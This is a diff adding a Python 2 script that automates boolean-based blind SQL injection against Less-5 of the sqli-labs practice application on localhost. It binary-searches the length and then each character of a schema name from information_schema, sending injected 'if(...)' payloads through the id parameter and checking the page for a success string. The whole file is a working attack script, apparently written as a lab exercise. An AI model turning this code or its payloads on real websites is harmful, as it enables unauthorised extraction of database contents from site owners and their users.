@@ -1,0 +1,68 @@
+#coding:utf-8
+
+import requests
+import math
+
+ex_len1 = 1
+ex_len2 = 1
+res = requests.get("""http://localhost/sqli-labs-master/Less-5/index.php?id=1' and 1=if(length((select schema_name from information_schema.schemata limit 5,1)) > %s,1,2)%%23""" % ex_len1)
+sucess = 'You are in...........'
+
+while 1 :
+    if sucess in res.text :
+        ex_len2 = ex_len1
+        ex_len1 = ex_len1 * 2
+        res = requests.get("""http://localhost/sqli-labs-master/Less-5/index.php?id=1' and 1=if(length((select schema_name from information_schema.schemata limit 5,1)) > %s,1,2)%%23""" % ex_len1)
+    else :
+        break
+
+if (ex_len1 - ex_len2 == 1):
+    print ex_len1
+else :
+    ex_len3 = ex_len1
+    ex_len1 = (ex_len1 + ex_len2) / 2
+    res = requests.get("""http://localhost/sqli-labs-master/Less-5/index.php?id=1' and 1=if(length((select schema_name from information_schema.schemata limit 5,1)) > %s,1,2)%%23""" % ex_len1)
+    while (math.fabs(ex_len1 - ex_len2) != 0 and math.fabs(ex_len1 - ex_len3) != 0):
+        if sucess in res.text :
+            ex_len2 = ex_len1
+            ex_len1 = (ex_len2 + ex_len3) / 2
+            res = requests.get("""http://localhost/sqli-labs-master/Less-5/index.php?id=1' and 1=if(length((select schema_name from information_schema.schemata limit 5,1)) > %s,1,2)%%23""" % ex_len1)
+        else :
+            ex_len3 = ex_len1
+            ex_len1 = (ex_len2 + ex_len3) / 2
+            res = requests.get("""http://localhost/sqli-labs-master/Less-5/index.php?id=1' and 1=if(length((select schema_name from information_schema.schemata limit 5,1)) > %s,1,2)%%23""" % ex_len1)
+    length = max(ex_len1, ex_len2, ex_len3)
+    print length
+
+
+a = 1
+while(a <= length) :
+    ex_asc1 = 1
+    ex_asc2 = 1
+    res = requests.get("""http://localhost/sqli-labs-master/Less-5/index.php?id=1' and 1=if(ord(substr((select schema_name from information_schema.schemata limit 5,1), %s, 1)) > %s,1,2)%%23""" % (a, ex_asc1))
+    while 1 :
+        if sucess in res.text :
+            ex_asc2 = ex_asc1
+            ex_asc1 = ex_asc1 * 2
+            res = requests.get("""http://localhost/sqli-labs-master/Less-5/index.php?id=1' and 1=if(ord(substr((select schema_name from information_schema.schemata limit 5,1), %s, 1)) > %s,1,2)%%23""" % (a, ex_asc1))
+        else :
+            break
+
+    if (ex_asc1 - ex_asc2 == 1):
+        pass
+
+    else :
+        ex_asc3 = ex_asc1
+        ex_asc1 = (ex_asc1 + ex_asc2) / 2
+        res = requests.get("""http://localhost/sqli-labs-master/less-5/index.php?id=1' and 1=if(ord(substr((select schema_name from information_schema.schemata limit 5,1), %s, 1)) > %s,1,2)%%23""" % (a, ex_asc1))
+        while (math.fabs(ex_asc1 - ex_asc2) != 0 and math.fabs(ex_asc1 - ex_asc3) != 0):
+            if sucess in res.text :
+                ex_asc2 = ex_asc1
+                ex_asc1 = (ex_asc2 + ex_asc3) / 2
+                res = requests.get("""http://localhost/sqli-labs-master/less-5/index.php?id=1' and 1=if(ord(substr((select schema_name from information_schema.schemata limit 5,1), %s, 1)) > %s,1,2)%%23""" % (a, ex_asc1))
+            else :
+                ex_asc3 = ex_asc1
+                ex_asc1 = (ex_asc2 + ex_asc3) / 2
+                res = requests.get("""http://localhost/sqli-labs-master/Less-5/index.php?id=1' and 1=if(ord(substr((select schema_name from information_schema.schemata limit 5,1), %s, 1)) > %s,1,2)%%23""" % (a, ex_asc1))
+        print chr(max(ex_asc1, ex_asc2, ex_asc3)),
+    a += 1
